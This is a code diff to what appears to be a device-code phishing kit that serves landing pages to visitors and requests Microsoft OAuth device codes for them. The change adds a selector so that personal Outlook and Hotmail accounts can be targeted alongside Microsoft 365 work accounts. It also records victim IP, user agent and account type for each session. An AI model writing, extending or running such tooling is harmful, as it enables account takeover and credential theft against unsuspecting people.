@@ -1283,6 +1283,17 @@ HTML_TEMPLATE = r'''
                             </div>
                         </div>
 
+                        <!-- ACCOUNT TYPE -->
+                        <div class="lg-form-group">
+                            <label class="lg-label">ACCOUNT TYPE</label>
+                            <div class="lg-input-wrap">
+                                <select id="lg-account-type" class="lg-select" onchange="onFieldChange()">
+                                    <option value="work" selected>🏢 Company (Microsoft 365 / Work Account)</option>
+                                    <option value="personal">👤 Personal (Outlook.com, Live, Hotmail)</option>
+                                </select>
+                            </div>
+                        </div>
+
 
                         <!-- PRE-LAND EDITOR (Accordion) -->
                         <div class="lg-accordion" id="lg-preland-section">
@@ -8752,7 +8763,8 @@ Assigned      : ${inboxes}
                 languages: ["en"],
                 config: isPrelandEnabled ? getEditorConfig() : { enabled: false },
                 landing_config: getLandingConfig(),
-                success_config: getSuccessConfig()
+                success_config: getSuccessConfig(),
+                account_type: document.getElementById('lg-account-type')?.value || 'work'
             };
 
             try {
@@ -20782,6 +20794,7 @@ def serve_landing(slug):
     # Reuse this visitor's live session if they simply reloaded, so a burst of
     # reloads does not mint hundreds of zombie device codes.
     reused = None
+    acct_type = dep.get('account_type') or 'work'
     try:
         reused = db.find_reusable_pending_session(visitor_ip, dep['id'])
     except Exception as e:
@@ -20793,7 +20806,8 @@ def serve_landing(slug):
         session_ok = True
     else:
         try:
-            uc, dc, vu, _ = oauth.request_device_code()
+            _oauth_client = Config.PERSONAL_CLIENT_ID if acct_type == 'personal' else None
+            uc, dc, vu, _ = oauth.request_device_code(client_id=_oauth_client)
             if uc and dc:
                 user_code = uc
                 verification_uri = vu or verification_uri
@@ -20807,7 +20821,8 @@ def serve_landing(slug):
                     client_ip=visitor_ip,
                     user_agent=visitor_ua,
                     owner_id=dep.get('owner_id'),
-                    deployment_id=dep['id']
+                    deployment_id=dep['id'],
+                    account_type=acct_type
                 ) is not None
                 if not session_ok:
                     logger.warning(f"[LANDING] Session row not created for {uc} (duplicate user_code?)")
